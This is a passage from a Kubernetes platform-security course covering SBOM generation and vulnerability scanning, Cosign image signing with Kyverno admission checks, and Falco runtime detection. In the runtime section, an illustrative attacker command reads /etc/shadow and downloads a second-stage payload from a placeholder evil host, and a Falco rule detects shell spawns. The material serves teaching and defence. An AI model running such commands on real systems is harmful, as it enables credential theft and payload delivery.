- **It maps to named, rising risk.** OWASP Kubernetes **K02 (supply chain)** and **K10
 (outdated components)** are exactly this module — the cross-cutting layer flagged in
.

---

### 3. Mental model

Hold one picture: the **artifact's journey**, and the three facts the platform attaches
along the way.

```text
 SOURCE BUILD ARTIFACT REGISTRY DEPLOY
 (git) ──► (CI/CD) ──► (image) ──► (push + ──► (admission
 │ │ │ attach) verifies)
 │ generate + facts attach attestations 
 │ scan here to the image travel with it checks facts,
 ▼ │ │ │ admits ONLY
 pinned ┌────────┐ ┌────────┐ ┌──────────┐ verified,
 deps, │ SBOM │ │ Grype │ │ cosign │ scanned
 Renovate │ (Syft) │ │ scan │ │ attest │ artifacts
 └────────┘ └────────┘ └──────────┘
 what's? vulns? who built it?
```

Left to right: the platform attaches **inventory**, a **scan verdict**, and
**provenance** as the artifact is built, and those facts travel with it into the
registry. This module produces them; ** is the gate on the right** that
refuses anything whose facts don't check out — so "only known-good, scanned, attested
artifacts ship" is a property of the pipeline, not a hope.

---

### 4. Minimal implementation

Start with the gap, not the tool. Ask the uncomfortable question about any production
image:

```console
$ # Do you even know what's inside this image?
$ docker history --no-trunc python:3.12-slim | wc -l
19
$ #...a count of layers, NOT the packages inside them.
```

`docker history` shows *layers*, not *contents*. You ran `pip install`; you don't know
the resulting 200+ packages, which carry CVEs, or whether any is a typosquat. Close
that blind spot in **two commands** — inventory, then scan:

```bash
# 1. Inventory: what is actually inside? (SBOM in SPDX JSON)
syft python:3.12-slim -o spdx-json=sbom.json

# 2. Scan that inventory for known vulnerabilities
grype sbom:./sbom.json
```

The first turns "I think it's fine" into a concrete component list; the second ranks it
by known CVEs. To make it a **gate** rather than a report, fail on severity:

```bash
# Exit non-zero (fails the CI job) if anything is High or Critical
grype sbom:./sbom.json --fail-on high
```

That single flag is the difference between "we scan" and "vulnerable images can't ship."
Wire it into the paved road once and every team inherits the gate. The lab adds triage
config and a signed SBOM attestation on top.

---

### 5. Hands-on lab

You'll build a deliberately non-distroless sample image, generate an SBOM with Syft,
scan it with Grype, fail the build on high/critical findings while triaging a false
positive, and attach a signed SBOM **attestation** with Cosign — the exact artifact
 will later verify at admission.

➡️ **Start the lab**

---

### 6. Production considerations

- **The pipeline is the only place this scales.** Generate the SBOM, scan, and attest in
 CI on every build, as non-optional stages of the golden path. A capability that relies
 on engineers remembering to run a tool is not a capability.
- **Store SBOMs and attestations as artifacts.** Keep each one next to (or attached to)
 its image, keyed by digest. When a zero-day lands you query stored SBOMs — you don't
 re-scan the world.
- **Scan continuously, not just at build.** New CVEs land daily; an image that passed
 last week fails today. Re-scan registry images on a schedule so "clean at build"
 doesn't rot into "vulnerable in production."
- **Budget for triage; don't bypass the gate.** Real pipelines hit false positives and
 un-fixable transitive CVEs. Use an auditable ignore list with a reason and an expiry —
 never a blanket `--fail-on never`. A gate with a logged exception process stays
 trustworthy.
- **Pin and auto-update.** Pin dependencies and base-image digests for reproducible
 builds, then let Renovate/Dependabot move the pins forward on a bot's PR.

---

### 7. Common mistakes

- **"We hardened the container, so we're covered."** — Runtime hardening
 protects a *running* image; it does nothing about a malicious or vulnerable artifact.
 *Fix:* add build-time inventory, scanning, and provenance — guard the artifact, not
 just the process.
- **Scanning without an inventory.** — Running a scanner ad hoc and keeping nothing. When
 a CVE drops you can't answer "where are we affected?" *Fix:* store an SBOM per build so
 exposure is a query, not an archaeology dig.
- **Treating a clean scan as "secure."** — Scanners find *known* CVEs in *known*
 packages; they miss zero-days, logic flaws, and a cleverly named typosquat. *Fix:*
 combine scanning with provenance, pinned-and-updated deps, and signature verification.
- **Blanket-ignoring to make the build green.** — Disabling the gate or ignoring every
 finding to ship. *Fix:* triage specific CVEs with a documented reason and an expiry;
 keep the gate failing on everything else.
- **Generating attestations nobody verifies.** — Signing provenance and SBOMs that no
 admission control ever checks. *Fix:* pair generation (here) with enforced verification
 at admission.

---

### 8. Assessment

**Knowledge checks**

1. Why is an SBOM the *precondition* for the rest of supply chain security? Give the
 concrete incident-response reason.
2. Describe the SolarWinds pattern in one sentence, and say which link in the chain was
 attacked — the running app, or something else.
3. What do SLSA levels 1, 2, and 3 each *add* over the rung below?
4. Grype and Trivy do largely the same job. What is the *platform* decision that matters
 more than which scanner you pick?
5. What does `cosign attest` produce, and which module actually *verifies* it?

**Concept exercise**

> Explain to a product team **why** you're adding two pipeline stages — one that
> inventories every artifact, one that records who built it from what — **without naming
> any tool.** Make the "when the next zero-day drops" argument land.

**Trade-off / debugging exercise**

> A team's build just started failing: Grype reports a Critical CVE in a transitive
> dependency, but no fixed version exists yet and a release is due today.
>
> What do you do *right now* to ship safely, how do you keep the gate trustworthy for
> every other build, and how would you make this policy next time instead of a scramble?

<details>
<summary>Discussion (open after you've answered)</summary>

- **SBOM as precondition:** you can't patch or scan components you can't enumerate; in an
 incident a stored SBOM turns "are we affected by CVE-X?" into a one-line query.
- **SolarWinds:** attackers compromised the *build pipeline* and shipped a backdoor in a
 signed update — the trusted artifact, not the running app, was the vector.
- **SLSA:** L1 adds *provenance* (how it was built); L2 adds a *signature* from a hosted
 builder so tampering is detectable; L3 adds *isolated, hardened builds* with
 non-falsifiable provenance.
- **Scanner choice:** the tool (Grype vs Trivy) barely matters; what matters is a
 **non-optional CI gate that fails on high/critical**, with stored results and triage.
- **`cosign attest`:** produces a signed attestation (an SBOM/provenance predicate)
 attached to the image; **** verifies it at admission.
- **Debugging:** triage the CVE, then add a *scoped, time-boxed* ignore rule with a reason
 (not a blanket bypass) so only this CVE passes while the gate still fails on everything
 else; let a bot bump it when a fix ships. Systematize it with an expiring exception list
 reviewed in CI.

</details>

---

### 9. Further reading

- SLSA — [Supply-chain Levels for Software Artifacts](https://slsa.dev/)
- Anchore — [Syft (SBOM generator)](https://github.com/anchore/syft) and
 [Grype (scanner)](https://github.com/anchore/grype)
- SBOM formats — [SPDX](https://spdx.dev/) and [CycloneDX](https://cyclonedx.org/)
- Sigstore — [Cosign](https://github.com/sigstore/cosign) and
 [keyless signing](https://docs.sigstore.dev/cosign/signing/overview/)
- CISA — [Software Bill of Materials (SBOM)](https://www.cisa.gov/topics/information-communications-technology-supply-chain-security/sbom)
- CISA — [ED 21-01: Mitigate SolarWinds Orion Code Compromise](https://www.cisa.gov/news-events/directives/ed-21-01-mitigate-solarwinds-orion-code-compromise)

---


_Previous:_ Secret Management
· _Next:_ Image Signing and Verification →

---

## Image Signing and Verification

> You scanned and attested your image in. But how does the *cluster* know
> the image it's about to run is the one your pipeline actually built — and not a
> look-alike an attacker pushed to the registry? **Signing** proves authorship and
> integrity; **verification at admission** refuses anything unsigned. This module uses
> Cosign to sign and Kyverno `verifyImages` to enforce — finishing the supply-chain
> guardrail Project 2 started in its Pass-2 policy.

**You'll need:** · Policy as Code with Kyverno,
 · Supply Chain Security, Docker, and a
working `kubectl` + [kind](https://kind.sigs.k8s.io/).

### Learning objectives

By the end of this module you will be able to:

- Explain what a signature proves and what it does **not**.
- Sign a container image with **Cosign**, using both key-pair and **keyless** flows.
- Describe the role of **Fulcio** (certificates) and **Rekor** (transparency log) in
 keyless signing.
- Enforce "only signed images run" with a Kyverno **`verifyImages`** policy.
- Pin verification to a specific signer **identity**, not just "any signature."

---

### 1. Concept

#### What signing proves

 answered "what's inside this image?" (SBOM) and "is it vulnerable?"
(scanning). Signing answers a different, equally critical question: **"did the party I
trust actually produce this exact artifact, and has it been tampered with since?"**

A registry tag like `myapp:1.4.0` is just a mutable pointer. Anyone with push access —
or anyone who compromises the registry, or wins a typosquat — can make that tag point
at a different image. Pulling by tag is trusting a label. A **signature** binds a
cryptographic identity to an **immutable digest** (`sha256:…`), so verification can
assert two things at once:

- **Integrity** — the bytes are exactly what was signed; a single changed layer breaks
 the signature.
- **Provenance / authenticity** — a specific, named identity signed it (your CI
 pipeline, a release key), not "someone."

What it does **not** prove: that the image is *safe*. A signed image can still be
vulnerable or malicious — signing proves *who* and *what*, not *good*. That's why
signing complements scanning and attestation; it doesn't replace them.

#### Sigstore and Cosign

**Sigstore** is the open-source project that made signing practical for the cloud-
native world; **Cosign** is its container-signing tool. Cosign stores signatures as
OCI artifacts *alongside the image in the same registry*, so there is no separate
signature database to run. Two signing models matter:

- **Key-pair signing.** You generate a private/public key pair; CI signs with the
 private key, verifiers trust the public key. Simple and offline-friendly, but you
 now own a **long-lived private key** — it must be stored, rotated, and never leaked.
 Key management is the hard, failure-prone part.
- **Keyless signing.** No long-lived key at all. This is the recommended model.

#### Keyless signing: Fulcio + Rekor

Keyless signing replaces "a key you keep" with "an identity you already have":

```text
 CI job needs to sign an image
 │
 ▼
 1. Prove identity via OIDC ──► (GitHub Actions / cloud SA issues a short-lived token)
 │
 ▼
 2. Fulcio (CA) issues a SHORT-LIVED certificate bound to that identity
 │
 ▼
 3. Sign the image digest with the ephemeral key; the key is then thrown away
 │
 ▼
 4. Rekor (transparency log) records the signature immutably & publicly
 │
 ▼
 Verifier later checks: valid cert chain + identity matches + logged in Rekor
```

- **OIDC identity.** The signer authenticates as a workload identity — e.g. a GitHub
 Actions workflow (`https://github.com/org/repo/.github/workflows/build.yaml@refs/heads/main`)
 or a cloud service account — issued by an OIDC provider
 (`https://token.actions.githubusercontent.com`).
- **Fulcio** is a certificate authority that issues an **ephemeral** signing
 certificate tied to that identity, valid for minutes. There is no private key to
 store, rotate, or steal — the biggest operational win.
- **Rekor** is an append-only, public **transparency log**. Every signature is
 recorded, so you get an auditable "this identity signed this digest at this time"
 history that an attacker cannot quietly erase.

The payoff: signatures are tied to *verifiable CI identities*, and there are no keys to
leak. The cost: verification depends on the identity model and (for public keyless)
Sigstore's public-good infrastructure — in production many teams run their own.

#### Verifying: `cosign verify`

Verification re-checks the chain. The crucial point is that you **pin the identity** —
otherwise you only prove "*somebody* signed it," which a determined attacker can also
do:

```bash
cosign verify \
 --certificate-identity "https://github.com/org/repo/.github/workflows/build.yaml@refs/heads/main" \
 --certificate-oidc-issuer "https://token.actions.githubusercontent.com" \
 ghcr.io/org/myapp:1.4.0
```

A signature from the wrong identity, the wrong issuer, or a tampered image all fail.

#### Enforcing at admission: Kyverno `verifyImages`

A signature nobody checks is theatre. The platform makes verification **structural** by
checking it at admission — the same guardrail pattern as. Kyverno's
`verifyImages` rule verifies signatures (and attestations) *before* a pod is allowed to
run, and — importantly — **mutates the image reference to its digest** so what runs is
exactly what was verified (no tag-swap race):

```yaml
verifyImages:
 - imageReferences:
 - "ghcr.io/org/*"
 mutateDigest: true
 required: true
 attestors:
 - entries:
 - keyless:
 issuer: "https://token.actions.githubusercontent.com"
 subject: "https://github.com/org/*"
```

This is exactly the policy
Project 2 shipped in its Pass-2 set:
only keyless-signed images from the allowed registry and identity may run; everything
else is rejected. This module is where that policy's machinery finally makes sense.

#### Signature policies: who may sign what

Verification is only as strong as the identities you allow. A mature policy constrains
**which identities may sign for which registry paths** — e.g. only the `payments`
pipeline identity may sign `ghcr.io/org/payments/*`. That prevents a compromised
low-value pipeline from signing a high-value image. "Require a signature" is the floor;
"require *this signer's* signature for *this path*" is the real control.

---

### 2. Why it matters for platform engineering

- **It closes the supply chain.** Scanning (13.5) finds known-bad; signing +
 verification guarantees *origin*. Together they mean only artifacts your pipeline
 built, from inputs you controlled, can run — the structural answer to OWASP K02.
- **Keyless removes the worst footgun.** Long-lived signing keys are a classic leaked
 credential. Tying signatures to ephemeral, OIDC-based CI identities deletes an entire
 class of incidents.
- **Enforcement belongs in the platform, not the team.** Individual teams signing by
 convention is hope. One `verifyImages` ClusterPolicy makes "unsigned can't run" true
 for everyone, including images pulled by a compromised manifest.
- **Digest pinning kills the tag-swap race.** Verifying then mutating to the digest
 means the verified bytes are the bytes that run — tags can't be swapped between
 check and pull.
- **It produces audit evidence.** Rekor plus policy reports give you a provable chain:
 this identity built and signed this digest, and the cluster enforced it.

---

### 3. Mental model

A signed image is a **tamper-evident, notarized package**. The signature is the wax
seal (break it and everyone can tell); Fulcio is the notary that vouches for *who*
sealed it; Rekor is the public ledger recording that the sealing happened; and the
admission policy is the loading-dock guard who refuses any package whose seal doesn't
match the approved sender:

```text
 BUILD ──▶ sign (seal + notarized identity) ──▶ Rekor (public ledger)
 │
 registry: image@sha256:… + its signature │
 ▼
 DEPLOY ──▶ admission: Kyverno verifyImages ──┬─ seal valid AND identity allowed ─▶ run (pinned to digest)
 └─ missing / wrong identity / tampered ─▶ REJECTED
```

Remember two things: **pin the identity, not just "signed,"** and **verify where it's
enforced (admission), not where it's convenient (a doc).**

---

### 4. Minimal implementation

First, prove the gap. By default a cluster will happily run *any* image a registry
hands it — signed, unsigned, swapped, doesn't matter. There is no notion of "who made
this."

Now the smallest end-to-end proof of signing, using a local key pair (no accounts):

```bash
cosign generate-key-pair # creates cosign.key + cosign.pub
cosign sign --key cosign.key "$IMG" # $IMG is an image pushed by digest
cosign verify --key cosign.pub "$IMG" # ✅ prints the verified signature

# Tamper check: verifying a DIFFERENT, unsigned image fails outright:
cosign verify --key cosign.pub nginx:latest # ❌ no matching signatures
```

That `verify` is the whole idea: a cryptographic yes/no on "did the holder of this key
sign exactly these bytes?" The lab turns that yes/no into an **admission guarantee** —
a Kyverno `verifyImages` policy so the cluster runs the signed image and rejects the
unsigned one, exactly as Project 2's Pass-2 policy does with keyless identities.

---

### 5. Hands-on lab

You'll sign a container image with Cosign, verify it, then apply a Kyverno
`verifyImages` policy so the cluster **only runs the signed image** and rejects an
unsigned one — the local, free version of Project 2's Pass-2 enforcement.

➡️ **Start the lab**

---

### 6. Production considerations

- **Prefer keyless; if you use keys, treat them like crown jewels.** Keyless ties
 trust to CI identity and removes key storage. If a key pair is unavoidable, keep the
 private key in a KMS/HSM, rotate it, and scope its use tightly.
- **Always pin identity and issuer.** `required: true` with no identity constraint only
 proves "signed by someone." Constrain `subject`/`issuer` (and registry path) so only
 your pipeline's signature counts.
- **Plan for Rekor/Fulcio availability.** Verification reaches the transparency log and
 CA. For production, run your **own** Sigstore stack (or use a vendor's) rather than
 depending solely on the public-good instances, and cache/mirror as needed.
- **Mind `failurePolicy` again.** If the verification webhook is down and policy is
 `Fail`, deploys stop; if `Ignore`, unsigned images slip through. Make Kyverno HA and
 choose deliberately.
- **Verify attestations, not just signatures.** `verifyImages` can also require a valid
 SBOM/provenance attestation (from ), so admission checks *what* was built
 and *how*, not only *who* signed.
- **Roll out in audit first.** Like any policy, start `verifyImages` in `Audit` to find
 unsigned workloads, migrate teams to signing in CI, then `Enforce`.
- **Handle third-party and base images.** You won't control signatures for every
 upstream image; use scoped `imageReferences` and governed exceptions for vetted
 external images rather than disabling the policy.

---

### 7. Common mistakes

- **Requiring "a signature" but not an identity.** `required: true` with no
 `subject`/`issuer` lets an attacker sign their own malicious image and pass. *Fix:*
 always pin certificate identity, issuer, and registry path.
- **Signing the tag, reasoning about the tag.** Signatures bind to digests; if you
 verify a tag but deploy without digest pinning, the tag can be swapped after
 verification. *Fix:* `mutateDigest: true` so the verified digest is what runs.
- **Long-lived signing keys in CI.** A private key in a CI secret is a leak waiting to
 happen and undermines the whole scheme. *Fix:* keyless (OIDC) signing, or a KMS-held
 key you never export.
- **Verifying in a script, not at admission.** A verify step a team can forget or skip
 is not a control. *Fix:* enforce with a `verifyImages` ClusterPolicy so there's no
 bypass.
- **Treating a signature as a safety certificate.** Signed ≠ safe; a signed image can
 still be vulnerable. *Fix:* keep scanning and attestation (13.5) alongside signing.
- **Enforcing cluster-wide on day one.** Flipping `verifyImages` to `Enforce` before
 pipelines sign breaks every deploy. *Fix:* audit, migrate, then enforce.

---

### 8. Assessment

**Knowledge checks**

1. What two properties does verifying an image signature establish, and what does it
 *not* establish?
2. In keyless signing, what do Fulcio and Rekor each provide?
3. Why must a verification policy pin the signer **identity**, not just require "a
 signature"?
4. What does `mutateDigest: true` prevent?

**Concept exercise**

> Explain how a cluster can guarantee it only runs images your build pipeline produced
> **without using the words "Cosign," "signature," or "Kyverno."** Describe the
> guarantee and the trust anchor, not the tools.

**Trade-off / debugging exercise**

> A `verifyImages` policy is set to `required: true` for `ghcr.io/org/*` but has no
> identity constraints. A red-team pushes `ghcr.io/org/evil:1.0`, signs it keyless with
> their *own* GitHub identity, and it runs. Explain exactly why the policy let it
> through, what you'd add to stop it, and how the same policy should treat a legitimate
> third-party base image you don't build.

<details>
<summary>Discussion (open after you've answered)</summary>

- **Proves / not:** integrity (bytes match the signed digest) and provenance/
 authenticity (a named identity signed it). It does **not** prove the image is safe or
 vulnerability-free.
- **Fulcio / Rekor:** Fulcio is the CA that issues a short-lived certificate bound to
 an OIDC identity (no long-lived key); Rekor is the immutable, public transparency log
 that records the signature for later audit.
- **Pin identity:** a bare "require a signature" is satisfied by *any* valid signature,
 including one the attacker made for their own image. Pinning `subject`/`issuer`
 (and registry path) means only your pipeline's signature counts.
- **mutateDigest:** it rewrites the image reference to the verified `sha256:` digest, so
 the exact bytes that were verified are the bytes that run — closing the tag-swap race
 between check and pull.
- **Debugging:** the policy required *a* signature but constrained no identity, so the
 attacker's own keyless signature passed. Add `attestors.entries.keyless.subject` /
 `issuer` pinned to your pipeline and the `ghcr.io/org/*` path. For a legitimate
 external base image you don't build, scope `imageReferences` precisely and allow it
 via a separate rule or a governed, time-boxed `PolicyException` (and still scan it) —
 don't weaken the whole policy.

</details>

---

### 9. Further reading

- Sigstore — [Cosign documentation](https://docs.sigstore.dev/cosign/overview/)
- Sigstore — [Keyless signing (Fulcio & Rekor)](https://docs.sigstore.dev/cosign/signing/overview/)
- Kyverno — [Verify Images reference](https://kyverno.io/docs/writing-policies/verify-images/)
- Sigstore — [Rekor transparency log](https://docs.sigstore.dev/logging/overview/)
- SLSA — [Provenance and verification](https://slsa.dev/spec/v1.0/provenance)
- GitHub — [OIDC for signing in Actions](https://docs.github.com/en/actions/security-guides/using-openid-connect-with-reusable-workflows)

---


_Previous:_ Supply Chain Security
· _Next:_ Runtime Security →

---

## Runtime Security

> Every control in this phase so far stops a bad thing from *starting* — a policy rejects a
> pod, a signature gates an image, RBAC denies a call. But prevention fails eventually: a
> zero-day lands, an image is poisoned, a token is stolen. Runtime security assumes that moment
> has arrived and watches what your processes **actually do** — catching the breach in
> progress, not in the post-mortem.

**You'll need:** · Container Security
for `securityContext` and seccomp, a working `kubectl` + [kind](https://kind.sigs.k8s.io/),
and [Helm](https://helm.sh/).

### Learning objectives

By the end of this module you will be able to:

- Explain why **detection and response** is necessary even when prevention works.
- Describe how **Falco** uses **eBPF** to watch kernel syscalls from a DaemonSet.
- Write a **Falco rule** — condition, output, priority, tags — using macros and lists.
- Contrast **Pod Security Standards** (prevention at admission) with runtime detection, and
 apply `restricted` namespace-wide.
- Triage a runtime alert, enrich it with Kubernetes context, and respond safely.

---

### 1. Concept

#### Prevention is necessary but insufficient

 has been about *prevention*: admission rejects a non-compliant pod, a
signature gate blocks an unsigned image, RBAC denies a bad call.
Each decides, *before* a workload runs, whether it may exist — where most effort belongs,
because the cheapest breach never starts.

But every preventive control judges what a workload *is* — image, spec, permissions — at
admission time, and never what it *does* once running. A pod that passed every gate can still
be hit by a zero-day, pull a second-stage payload, or be driven by a stolen-but-valid
credential. **Assume breach** is the honest default. The only thing between a
foothold and an incident is then a layer *watching behaviour in real time* — **runtime
security**, layer 7 of defence in depth.

#### Watch behaviour, not just configuration

Config-time controls answer *"is this allowed to run?"* Runtime controls answer *"is this
process doing something it never should?"* — behavioural signals an attacker must generate
however they got in:

```text
 Behaviour an attacker generates Why it's suspicious
 ─────────────────────────────── ──────────────────────────────
 Shell spawned inside a container apps don't exec /bin/sh themselves
 Unexpected outbound connection C2 callback or data exfiltration
 Write to /etc, /bin, or a secret tampering or persistence
 Package manager run in production build tools in a prod container
 Mount of host FS or docker.sock container-escape attempt
```

None are visible to an admission controller — they happen *after* the pod runs, so catching
them means watching its actual syscalls.

#### Falco: syscalls, eBPF, and a rules engine

Enter **Falco**, the de-facto open-source runtime security engine (a CNCF graduated
project). It runs as a **DaemonSet** — one pod per node — and taps the **syscalls** every
container makes to the kernel (`execve`, `connect`, `open`). Syscalls are the narrow waist
every program passes through, so watching them catches behaviour in any language. Modern
Falco taps them with a small **eBPF** program — sandboxed, verified code in the kernel —
seeing every syscall with low overhead and no fragile kernel module, matching each against
**rules**. A match emits an **alert** to an **output**: stdout (used in the lab), a file, or
**Falcosidekick**, which fans alerts to Slack or a SIEM.

#### Anatomy of a Falco rule

A Falco rule is YAML. Learn five fields and you can read or write any of them:

```yaml
- rule: Terminal shell in container # unique name
 desc: A shell was spawned inside a container # human explanation
 condition: > # boolean trigger (syscall filter)
 spawned_process and container
 and proc.name in (shell_binaries)
 output: > # message + context
 Shell in pod (ns=%k8s.ns.name pod=%k8s.pod.name cmd=%proc.cmdline)
 priority: WARNING # severity (emergency … debug)
 tags: [shell, mitre_execution] # routing / filtering
```

Two features keep rules DRY: **macros** (named condition snippets — `spawned_process` and
`container` are built-ins) and **lists** (named value sets — `shell_binaries` is a built-in
`(ash, bash, dash, sh, zsh, …)`). Falco ships a large default ruleset; you *tune* it —
silence noise, raise priorities, add your own "never happen" rules.

#### Pod Security Standards: prevention at admission

Runtime detection is layer 7, *paired* with a preventive control one layer down. **Pod
Security Standards (PSS)** are Kubernetes' built-in definition of three progressively stricter
workload profiles, enforced by the built-in **Pod Security Admission** controller (nothing to
install) via a namespace label like `pod-security.kubernetes.io/enforce: restricted`:

```text
 Privileged no restrictions — host access and privileged containers allowed
 Baseline blocks known-dangerous settings (hostNetwork, privileged, hostPath …)
 Restricted hardened: non-root, drop ALL caps, seccomp RuntimeDefault, no escalation
```

A pod that violates `restricted` is **rejected at admission** — the non-root, drop-caps,
read-only, no-privilege-escalation, seccomp-`RuntimeDefault` hardening from, now
a *namespace-wide floor* no one can forget. PSS **prevents**; Falco **detects** what slips
past. Where PSS is too coarse (three fixed levels), **Kyverno** adds finer
custom rules — PSS as the floor, Kyverno for specifics.

#### Seccomp, AppArmor, and stronger isolation

Two more kernel controls shrink what a running container *can* do. **Seccomp** filters the
syscalls a container may make; `seccompProfile: RuntimeDefault` blocks dozens of dangerous
ones and is the sensible floor (part of `restricted`). **AppArmor** (or SELinux) restricts
which files and capabilities a process may touch — for the filesystem what seccomp is for
syscalls.

When a workload is genuinely untrusted — multi-tenant SaaS, customer code — a hardened
container still shares one kernel with its neighbours, and a kernel exploit escapes it. Two
runtimes raise that wall via a **`runtimeClass`**: **gVisor** runs a user-space kernel that
intercepts syscalls before they reach the host; **Kata Containers** wraps each pod in a
lightweight VM with its own kernel. The trade-off is always **isolation versus overhead and
compatibility** — use them only where an escape's blast radius justifies the cost. Default
runtime + PSS + Falco suits most workloads.

---

### 2. Why it matters for platform engineering

- **Prevention has a ceiling; detection does not.** Harden admission forever and you still
 won't see a stolen credential used by a valid pod — runtime is the only layer that watches
 the attack *in progress*.
- **One DaemonSet secures every team.** Install Falco once, cluster-wide, and every workload
 gets runtime visibility for free — no team learns eBPF. 's leverage, at layer 7.
- **Detection without response is theatre.** The platform owns the alert→action pipeline —
 enrich with Kubernetes context, route to the owning team, kill or quarantine when it counts.
- **Feedback into prevention.** Every real alert is a prevention gap — a shell-in-prod alert
 becomes a Kyverno policy or PSS tightening. Detection tells you *what to prevent next*.

---

### 3. Mental model

Hold one picture: **prevention and detection are two halves of a timeline, meeting the
moment a workload starts running.**

```text
 PREVENT (before run) │ DETECT + RESPOND (while running)
 ──────────────────────────────────┼──────────────────────────────────────▶ time
 PSS · Kyverno · signing · RBAC │ Falco watches syscalls → triage → respond
 reject if not ── pod admitted ───▶│ "DOING something wrong?" ─▶ feed back to PREVENT
```

Left of the line is this phase so far: decide, once, whether a workload may exist. Right of
it is this module: assume one got through and watch what it does. The loop back into a new
preventive control is the point — detection finds the next thing worth preventing. A platform
that only prevents is blind after admission; one that only detects drowns in alerts it could
have blocked. Run both, centrally.

---

### 4. Minimal implementation

Start with the gap. Take a pod that passed every preventive control — signed image,
`restricted` namespace, least-privilege RBAC — compliant by every admission-time measure. An
attacker then exploits a flaw in the app and opens a shell inside it:

```console
$ kubectl exec -it payments-7f9 -- /bin/sh
/ # cat /etc/shadow 2>/dev/null; wget http://evil.example/stage2 -O /tmp/x
```

Ask the preventive layers what they saw. Admission? Nothing — the pod was admitted minutes
ago and its *spec* never changed. PSS? Satisfied — still non-root, caps dropped. Signature?
Still valid. RBAC? `exec` hit the kube-apiserver, but the *process inside the container* is
invisible to it. **Every preventive control is blind to a shell opened in a running
container** — none watch behaviour. That is the detection gap.

The smallest fix is one rule whose condition matches the syscall this attack cannot avoid —
`spawned_process and container and proc.name in (shell_binaries)`, an `execve` of a shell
binary in a container (the full rule is `custom-falco-rule.yaml`, loaded in the lab). The
*same* `kubectl exec` then emits an alert on stdout:

```console
Warning Shell spawned in container (ns=prod pod=payments-7f9 cmd=/bin/sh user=app …)
```

No app change, no sidecar, nothing the attacker can see — one rule turned an invisible
foothold into a timestamped, attributable event. The lab installs Falco on kind, fires this
rule, then shows PSS rejecting the privileged pod prevention should stop first.

---

### 5. Hands-on lab

You'll install Falco as a DaemonSet on a local kind cluster with Helm, load a custom
"shell in a container" rule, exec a shell into a pod and watch the alert fire, then apply a
`restricted` Pod Security Standards namespace and watch admission reject a privileged pod —
detection and prevention side by side, free on local kind.

➡️ **Start the lab**

---

### 6. Production considerations

- **Tune before you deploy widely, or drown.** The default ruleset is noisy — CI runners exec
 shells, operators run package managers. Baseline normal, scope expected cases, page only on
 high-signal rules; alert fatigue is the top reason runtime detection is ignored.
- **Pick the driver deliberately.** Prefer the **modern eBPF** probe on recent kernels (5.8+)
 — no kernel headers, survives upgrades. Fall back to the legacy probe or kernel module only
 where you must.
- **Alerts need a pipeline, not a log line.** Route Falco through **Falcosidekick** to a SIEM
 or Slack, enriched with Kubernetes metadata so an alert reaches the owning team.
- **Define response runbooks up front.** Per high-severity rule, decide the action — notify,
 cordon the node, or quarantine the pod (unschedulable, snapshot for forensics). Automate the
 safe ones; keep a human for the rest.
- **Mind the overhead and the sensor.** eBPF is cheap but not free at high syscall rates.
 Falco is privileged, so lock down who can edit its rules and output.
- **Runtime has SLOs too.** Track detection coverage (MITRE ATT&CK techniques with a rule),
 mean time to detect, and false-positive rate; feed true positives back into prevention.

---

### 7. Common mistakes

- **Treating prevention as sufficient.** "We enforce PSS and sign images, so we don't need
 runtime." Every preventive control is blind to a compromised-but-valid workload. *Fix:* run
 detection as a non-negotiable layer 7.
- **Deploying the default ruleset untuned.** Full ruleset straight to paging, then ignored in
 the flood. *Fix:* baseline normal, scope expected cases, page only on high-signal rules.
- **Alerting with no response plan.** Alerts stream into a channel nobody owns. *Fix:* define
 per-rule runbooks and route by ownership *before* turning a rule on.
- **Confusing PSS with runtime detection.** Thinking a `restricted` namespace means you're
 "covered" at runtime. PSS prevents *at admission* and sees nothing once the pod runs. *Fix:*
 PSS as the floor, Falco for behaviour.
- **Never closing the loop.** Triaging the same alert weekly, never preventing its cause.
 *Fix:* turn each recurring true positive into a Kyverno/PSS rule.

---

### 8. Assessment

**Knowledge checks**

1. Why can an admission controller never detect a shell opened in a running pod? What *can*?
2. How does Falco observe container behaviour, and why does eBPF suit a platform DaemonSet?
3. Name the three Pod Security Standards levels and say what `restricted` requires.
4. Name the five core fields of a Falco rule and what each is for.
5. When would you choose a gVisor or Kata `runtimeClass`, and what do you trade for it?

**Concept exercise**

> Explain **runtime detection** to a colleague **without naming Falco, eBPF, or any
> product** — only the problem it solves and the behaviours it watches. Make the
> "prevention is not enough" argument land.

**Trade-off / debugging exercise**

> Your team enabled the full default ruleset; the channel now gets hundreds of alerts a day
> and engineers muted it, so a real cryptominer ran for a week unnoticed. Explain how "more
> detection" produced *less* security, how you'd retune so the miner pages while CI shells stay
> quiet, and how you'd stop the *class* of problem.

<details>
<summary>Discussion (open after you've answered)</summary>

- **Admission vs runtime:** admission checks a pod's *spec* once; a shell is a *behaviour* (an
 `execve` syscall) with no spec change, so only a runtime syscall watcher (Falco via eBPF,
 cheaply and with no kernel module) sees it.
- **PSS levels:** Privileged, Baseline, Restricted (non-root, drop ALL caps, seccomp
 RuntimeDefault, no escalation) — enforced by namespace labels at admission. A Falco rule's
 fields are `rule`, `desc`, `condition`, `output`, `priority`, `tags`.
- **gVisor/Kata:** for untrusted/multi-tenant workloads facing a kernel escape — trading
 performance for a user-space kernel (gVisor) or a per-pod VM (Kata).
- **Alert fatigue:** untuned volume buried the true positive. Scope the shell rule off CI
 namespaces, prioritise miner-like behaviour (unexpected outbound + spawned binary), page only
 on high-signal rules, and feed true positives back into prevention.

</details>

---

### 9. Further reading

- Falco — [Documentation and architecture](https://falco.org/docs/)
- Falco — [Rules reference and the default ruleset](https://falco.org/docs/reference/rules/)
- Kubernetes — [Pod Security Standards](https://kubernetes.io/docs/concepts/security/pod-security-standards/)
- Kubernetes — [Restrict syscalls with seccomp](https://kubernetes.io/docs/tutorials/security/seccomp/)
 and [AppArmor](https://kubernetes.io/docs/tutorials/security/apparmor/)
- gVisor — [What is gVisor?](https://gvisor.dev/docs/)
- Kata Containers — [Documentation](https://katacontainers.io/)

---


_Previous:_ Image Signing and Verification
· _Next:_ Zero Trust for Platforms →

---

## Zero Trust for Platforms

> The seven defence-in-depth layers all point at one idea: stop trusting the network.
> "Inside the cluster" is not a credential. **Zero trust** says every request — human or
> workload — must prove *who it is* and *that it's allowed*, every time, regardless of
> where it comes from. This capstone module ties the phase together: workload identity,
> mutual TLS, identity-based authorization, and the elimination of standing privilege.

**You'll need:** · Security Principles,
 · RBAC Deep Dive, and a working
`kubectl` + [kind](https://kind.sigs.k8s.io/) (the lab adds Cilium).

### Learning objectives

By the end of this module you will be able to:

- State the three zero-trust principles and contrast them with perimeter security.
- Explain **workload identity** (SPIFFE/SPIRE) and why services need cryptographic IDs.
